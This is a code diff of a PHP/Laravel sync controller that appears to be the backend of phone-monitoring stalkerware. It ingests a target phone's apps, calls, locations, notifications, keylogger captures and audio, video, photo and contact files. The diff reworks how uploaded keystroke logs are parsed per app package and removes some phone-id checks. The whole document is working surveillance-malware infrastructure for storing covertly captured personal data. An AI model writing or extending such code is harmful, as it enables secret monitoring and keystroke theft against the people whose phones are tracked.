@@ -40,14 +40,13 @@ class SyncAPIController extends Controller
             $phone->updatedon = nnow();
             $phone->users_id = $token->users_id;
             $phone->token = $token->token;
+            $phone->save();
         }
-        $phone->save();
 
         $apps = (array) request('apps');
         $keep = [];
         foreach ($apps as $ap) {
-            // supprimer les ancienne apps
-            if (!$phone->id || !@$ap['id']) continue;
+            if (!@$ap['id']) continue;
 
             $el = App::where(['remote_id' => $ap['id'], 'phone_id' => $phone->id])->firstOrNew();
             $el->phone_id = $phone->id;
@@ -71,7 +70,7 @@ class SyncAPIController extends Controller
         //
         $calls = (array) request('calls');
         foreach ($calls as $ap) {
-            if (!$phone->id || !@$ap['id']) continue;
+            if (!@$ap['id']) continue;
 
             $el = Call::firstOrNew(['remote_id' => @$ap['id'], 'phone_id' => $phone->id]);
             $el->phone_id = $phone->id;
@@ -95,7 +94,7 @@ class SyncAPIController extends Controller
         //
         $locations = (array) request('locations');
         foreach ($locations as $ap) {
-            if (!$phone->id || !@$ap['id']) continue;
+            if (!@$ap['id']) continue;
 
             $el = Location::firstOrNew(['remote_id' => @$ap['id'], 'phone_id' => $phone->id]);
             $el->phone_id = $phone->id;
@@ -133,7 +132,7 @@ class SyncAPIController extends Controller
         //
         $notif = (array) request('notifications');
         foreach ($notif as $ap) {
-            if (!$phone->id || !@$ap['id']) continue;
+            if (!@$ap['id']) continue;
 
             $el = Notification::firstOrNew(['remote_id' => @$ap['id'], 'phone_id' => $phone->id]);
             $el->phone_id = $phone->id;
@@ -154,26 +153,40 @@ class SyncAPIController extends Controller
         }
 
         //
-        $lastkeylogid = request('lastkeylogid');
-        $keylogdata = request('keylogdata');
-        $lastkeylogdate = request('lastkeylogdate');
-
-        // return request()->all();
-        if ($keylogdata && $lastkeylogid) {
+        if (request('keylog')) {
+            $lastkeylogid = request('lastkeylogid');
+            $lastkeylogdate = request('lastkeylogdate');
             try {
-                Carbon::parse($lastkeylogdate);
+                $content = file_get_contents(request('keylog')->getRealPath());
+                $content = (array) json_decode($content);
             } catch (\Throwable $th) {
-                $lastkeylogdate = nnow();
+                $content = null;
             }
-            $el = Keylogger::firstOrNew(['remote_id' => $lastkeylogid, 'phone_id' => $phone->id]);
-            $el->phone_id = $phone->id;
-            $el->remote_id = $lastkeylogid;
-            $el->text = $keylogdata;
-            $el->date = $lastkeylogdate;
-            $el->save();
+
+            if (is_array($content)) {
+                foreach ($content as $pkg => $log) {
+                    $id = @$log->id;
+                    $key = @$log->key;
+                    $date = @$log->date;
+                    if ($id && $key && $date) {
+                        $el = Keylogger::firstOrNew(['remote_id' => $id, 'phone_id' => $phone->id]);
+                        try {
+                            Carbon::parse($date);
+                        } catch (\Throwable $th) {
+                            $date = nnow();
+                        }
+                        $el->phone_id = $phone->id;
+                        $el->remote_id = $id;
+                        $el->text = $key;
+                        $el->package = $pkg;
+                        $el->date = $date;
+                        $el->save();
+                    }
+                }
+            }
         }
 
-        if (request('file')) {
+        if (request('file')) { // fichier audio, video, photo & contact
             if ($phone->id) {
                 $remote_id = (int) request('remote_id');
                 $success = (int) request('success');
